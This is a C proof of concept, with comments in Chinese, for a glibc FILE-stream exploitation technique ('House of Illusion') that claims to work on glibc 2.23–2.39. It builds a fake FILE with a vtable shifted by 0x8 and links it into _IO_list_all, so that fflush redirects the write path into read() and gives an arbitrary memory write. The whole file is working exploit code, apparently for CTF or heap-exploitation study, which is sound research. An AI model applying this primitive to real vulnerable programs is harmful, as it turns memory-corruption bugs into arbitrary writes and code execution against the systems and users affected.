#define _GNU_SOURCE

/*
 * House of Illusion 的 shifted vtable 读系统调用，适用于 glibc 2.23～2.39。
 *
 * 底层效果：read(fd, target, length)，因此从漏洞视角看是任意地址写。
 * 输入原语：已知 libc 地址，并能让 _IO_list_all 指向可控的 fake FILE。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_DELETE_DONT_CLOSE 0x0040
#define IO_IS_APPENDING 0x1000
#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static char input[] = "ILLUSION:FD-TO-MEMORY";
    char target[sizeof(input)] = {0};
    char lock[64] = {0};
    struct fake_file_plus fake;
    int pipe_fd[2];

    memset(&fake, 0, sizeof(fake));

    /* dlsym 只代替题目中的 libc 泄漏和符号偏移。 */
    void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
    unsigned char *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    assert(io_list_all != NULL && file_jumps != NULL);

    /* 保存真实链表头，PoC 结束前恢复。 */
    void *saved_list = *io_list_all;

    /* 用 pipe 准备底层 read 要读取的数据。 */
    assert(pipe(pipe_fd) == 0);
    assert(write(pipe_fd[1], input, sizeof(input)) == sizeof(input));
    close(pipe_fd[1]);

    /* fake FILE 需要一块清零的可写锁。 */
    fake.file._lock = (void *)lock;

    /* 只让 flush 遍历当前 fake FILE。 */
    fake.file._chain = NULL;
    fake.file._mode = 0;

    /* 这些 flags 让 shifted finish 进入 _IO_do_write，同时不关闭 pipe fd。 */
    fake.file._flags = IO_LINKED | IO_DELETE_DONT_CLOSE | IO_IS_APPENDING;
    fake.file._fileno = pipe_fd[0];

    /* _IO_do_write 会把这个区间作为 read 的目标地址和长度。 */
    fake.file._IO_write_base = target;
    fake.file._IO_write_ptr = target + sizeof(target);

    /*
     * overflow 槽原本位于表内 +0x18。vtable 向前移动 0x8 后：
     * 槽位平移结果：shifted overflow -> real finish；shifted write -> real read。
     */
    fake.vtable = file_jumps - 0x8;

    /* 漏洞模拟：把 fake FILE 放到 _IO_list_all 链表头。 */
    *io_list_all = &fake;

    /* fflush(NULL) 触发 finish -> _IO_do_write -> _IO_file_read。 */
    fflush(NULL);

    *io_list_all = saved_list;
    close(pipe_fd[0]);

    assert(memcmp(target, input, sizeof(input)) == 0);
    printf("[+] Illusion 任意写成功\n");
    return 0;
}
